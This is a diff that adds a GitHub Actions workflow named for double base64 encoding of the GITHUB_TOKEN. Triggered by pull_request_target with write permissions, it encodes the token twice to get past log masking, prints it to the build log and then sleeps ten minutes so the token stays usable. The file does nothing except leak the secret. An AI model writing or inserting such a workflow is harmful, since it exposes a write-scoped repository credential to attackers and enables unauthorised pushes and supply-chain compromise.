@@ -1,0 +1,27 @@
+name: Double base64 encoded GITHUB TOKEN
+
+on:
+  pull_request_target:
+    branches:
+      - "**"
+
+permissions:
+  contents: write  # Allows pushing files, creating commits, etc.
+  pull-requests: write  # Optional: if you also want to comment on PRs
+
+jobs:
+  get-token:
+    runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+    steps:
+      - name: Double base64 encoded GITHUB TOKEN
+        run: |
+          echo "$GITHUB_TOKEN" | base64 | base64 > double_encoded.txt
+          echo "Double Encoded GITHUB_TOKEN:"
+          cat double_encoded.txt
+
+      - name: Sleep
+        run: |
+          sleep 600
